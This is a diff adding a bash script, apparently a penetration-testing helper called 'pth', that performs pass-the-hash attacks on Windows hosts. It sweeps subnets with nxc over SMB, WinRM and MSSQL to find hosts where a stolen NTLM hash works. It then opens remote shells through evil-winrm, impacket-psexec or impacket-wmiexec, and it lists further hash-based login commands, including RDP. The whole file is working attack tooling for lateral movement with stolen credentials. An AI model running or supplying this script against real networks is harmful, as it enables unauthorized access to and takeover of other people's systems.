@@ -1,0 +1,157 @@
+#!/bin/bash
+
+RED='\033[31m'
+GREEN='\033[32m'
+BLUE='\033[34m'
+YELLOW='\033[33m'
+CYAN='\033[36m'
+NC='\033[0m'
+
+usage() {
+    echo -e "${RED}Usage: pth <target|cidr> <user> <hash> [--local-auth] [--domain <domain>]${NC}"
+    echo ""
+    echo -e "${BLUE}  pth 10.10.10.5 administrator aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c${NC}"
+    echo -e "${BLUE}  pth 10.10.10.5 administrator 8846f7eaee8fb117ad06bdd830b7586c --local-auth${NC}"
+    echo -e "${BLUE}  pth 10.10.10.0/24 administrator 8846f7eaee8fb117ad06bdd830b7586c${NC}"
+    echo ""
+    echo -e "${YELLOW}  Hash from SAM dump  → --local-auth  (local account)${NC}"
+    echo -e "${YELLOW}  Hash from NTDS/DCSync → no flag     (domain account)${NC}"
+    exit 1
+}
+
+[ "$#" -lt 3 ] && usage
+
+TARGET="$1"
+USER="$2"
+HASH="$3"
+LOCAL_AUTH=""
+DOMAIN=""
+
+for arg in "${@:4}"; do
+    case "$arg" in
+        --local-auth)   LOCAL_AUTH="--local-auth" ;;
+        --domain)       ;;
+        *)              [ "${prev:-}" = "--domain" ] && DOMAIN="$arg" ;;
+    esac
+    prev="$arg"
+done
+
+# Normalize hash — accept NT only or LM:NT
+if ! echo "$HASH" | grep -qP '^[a-f0-9]{32}:[a-f0-9]{32}$'; then
+    # NT only → prepend empty LM
+    HASH="aad3b435b51404eeaad3b435b51404ee:$HASH"
+fi
+NT_HASH=$(echo "$HASH" | cut -d: -f2)
+
+echo ""
+echo -e "${YELLOW}== Pass-the-Hash: $TARGET ==${NC}"
+echo -e "${CYAN}User: $USER | Hash: $NT_HASH${NC}"
+[ -n "$LOCAL_AUTH" ] && echo -e "${CYAN}Mode: local-auth${NC}" || echo -e "${CYAN}Mode: domain${NC}"
+echo ""
+
+# ── RANGE MODE ────────────────────────────────────────────────
+if echo "$TARGET" | grep -qP '/\d+$'; then
+    echo -e "${YELLOW}[*] Subnet sweep — finding pwned hosts...${NC}"
+    PWNED_SMB=()
+    PWNED_WINRM=()
+    PWNED_MSSQL=()
+
+    # SMB sweep
+    echo -e "\n${CYAN}[nxc smb sweep]${NC}"
+    while IFS= read -r line; do
+        echo "$line"
+        if echo "$line" | grep -q "\[+\]" && ! echo "$line" | grep -q "Guest"; then
+            IP=$(echo "$line" | grep -oP '\d+\.\d+\.\d+\.\d+' | head -1)
+            [ -n "$IP" ] && PWNED_SMB+=("$IP")
+        fi
+    done < <(nxc smb "$TARGET" -u "$USER" -H "$HASH" $LOCAL_AUTH 2>/dev/null)
+
+    # WinRM sweep
+    echo -e "\n${CYAN}[nxc winrm sweep]${NC}"
+    while IFS= read -r line; do
+        echo "$line"
+        if echo "$line" | grep -q "\[+\]" && echo "$line" | grep -qi "pwn3d\|Pwn3d"; then
+            IP=$(echo "$line" | grep -oP '\d+\.\d+\.\d+\.\d+' | head -1)
+            [ -n "$IP" ] && PWNED_WINRM+=("$IP")
+        fi
+    done < <(nxc winrm "$TARGET" -u "$USER" -H "$HASH" $LOCAL_AUTH 2>/dev/null)
+
+    # MSSQL sweep
+    echo -e "\n${CYAN}[nxc mssql sweep]${NC}"
+    while IFS= read -r line; do
+        echo "$line"
+        if echo "$line" | grep -q "\[+\]"; then
+            IP=$(echo "$line" | grep -oP '\d+\.\d+\.\d+\.\d+' | head -1)
+            [ -n "$IP" ] && PWNED_MSSQL+=("$IP")
+        fi
+    done < <(nxc mssql "$TARGET" -u "$USER" -H "$HASH" $LOCAL_AUTH 2>/dev/null)
+
+    # Summary
+    echo ""
+    echo -e "${YELLOW}== Summary ==${NC}"
+    echo -e "${CYAN}SMB   pwned: ${GREEN}${PWNED_SMB[*]:-none}${NC}"
+    echo -e "${CYAN}WinRM pwned: ${GREEN}${PWNED_WINRM[*]:-none}${NC}"
+    echo -e "${CYAN}MSSQL pwned: ${GREEN}${PWNED_MSSQL[*]:-none}${NC}"
+
+    if [ ${#PWNED_WINRM[@]} -gt 0 ]; then
+        echo ""
+        echo -e "${YELLOW}[*] WinRM targets — connect with:${NC}"
+        for ip in "${PWNED_WINRM[@]}"; do
+            echo -e "  ${GREEN}evil-winrm -i $ip -u $USER -H $NT_HASH${NC}"
+        done
+    fi
+
+    if [ ${#PWNED_SMB[@]} -gt 0 ]; then
+        echo ""
+        echo -e "${YELLOW}[*] SMB targets — connect with:${NC}"
+        for ip in "${PWNED_SMB[@]}"; do
+            echo -e "  ${GREEN}impacket-psexec -hashes :$NT_HASH $USER@$ip${NC}"
+            echo -e "  ${GREEN}impacket-wmiexec -hashes :$NT_HASH $USER@$ip${NC}"
+        done
+    fi
+
+    echo -e "${YELLOW}=================================${NC}"
+    exit 0
+fi
+
+# ── SINGLE TARGET MODE ────────────────────────────────────────
+echo -e "${CYAN}[*] Checking open ports...${NC}"
+WINRM_OPEN=false
+SMB_OPEN=false
+WMI_OPEN=false
+
+nc -z -w2 "$TARGET" 5985 2>/dev/null && WINRM_OPEN=true
+nc -z -w2 "$TARGET" 445  2>/dev/null && SMB_OPEN=true
+nc -z -w2 "$TARGET" 135  2>/dev/null && WMI_OPEN=true
+
+echo -e "  5985 WinRM : $([ "$WINRM_OPEN" = true ] && echo -e "${GREEN}open${NC}" || echo -e "${RED}closed${NC}")"
+echo -e "  445  SMB   : $([ "$SMB_OPEN"   = true ] && echo -e "${GREEN}open${NC}" || echo -e "${RED}closed${NC}")"
+echo -e "  135  WMI   : $([ "$WMI_OPEN"   = true ] && echo -e "${GREEN}open${NC}" || echo -e "${RED}closed${NC}")"
+echo ""
+
+if [ "$WINRM_OPEN" = true ]; then
+    echo -e "${GREEN}[→] Using evil-winrm (WinRM 5985)${NC}"
+    evil-winrm -i "$TARGET" -u "$USER" -H "$NT_HASH"
+
+elif [ "$SMB_OPEN" = true ]; then
+    echo -e "${GREEN}[→] Using impacket-psexec (SMB 445)${NC}"
+    echo -e "${BLUE}Alt: impacket-wmiexec -hashes :$NT_HASH $USER@$TARGET${NC}"
+    impacket-psexec -hashes ":$NT_HASH" "$USER@$TARGET"
+
+elif [ "$WMI_OPEN" = true ]; then
+    echo -e "${GREEN}[→] Using impacket-wmiexec (WMI 135)${NC}"
+    impacket-wmiexec -hashes ":$NT_HASH" "$USER@$TARGET"
+
+else
+    echo -e "${RED}[-] No usable port open (5985/445/135)${NC}"
+    echo ""
+    echo -e "${YELLOW}Manual options:${NC}"
+    echo -e "  ${GREEN}evil-winrm -i $TARGET -u $USER -H $NT_HASH${NC}"
+    echo -e "  ${GREEN}impacket-psexec -hashes :$NT_HASH $USER@$TARGET${NC}"
+    echo -e "  ${GREEN}impacket-wmiexec -hashes :$NT_HASH $USER@$TARGET${NC}"
+    echo -e "  ${GREEN}impacket-smbexec -hashes :$NT_HASH $USER@$TARGET${NC}"
+    echo -e "  ${GREEN}xfreerdp /u:$USER /pth:$NT_HASH /v:$TARGET /cert-ignore${NC}"
+fi
+
+echo ""
+echo -e "${YELLOW}=================================${NC}"
